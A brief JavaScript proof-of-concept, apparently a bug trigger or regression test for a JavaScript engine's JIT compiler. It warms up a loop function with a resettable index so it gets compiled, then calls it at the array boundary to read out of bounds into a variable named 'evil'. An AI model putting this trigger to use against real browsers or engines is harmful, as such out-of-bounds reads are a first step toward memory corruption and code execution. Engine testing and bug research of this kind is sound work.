function jit(a1, a2, a3, a4) {
    let arr2 = a1;
    let t = 0;
    for (let i8 = a2; i8 < a3; i8++) {
        if (i8 === magic) {
            i8 = a2;
            i8 += 1;
        }
        t = arr2[i8];
    }
    return [1.1,t];
}
let arr = [1.1,2.2,3.3,4.4,5.5];
arr.length = 4;
Array.isArray(arr);
magic = arr.length - 1;
for (let i34 = 0; i34 < 65536; i34++) {
    jit(arr, 0, 1, 1);
}
let offset = arr.length - 1;
let evil = jit(arr, offset, offset + 1, 1);
print(evil);
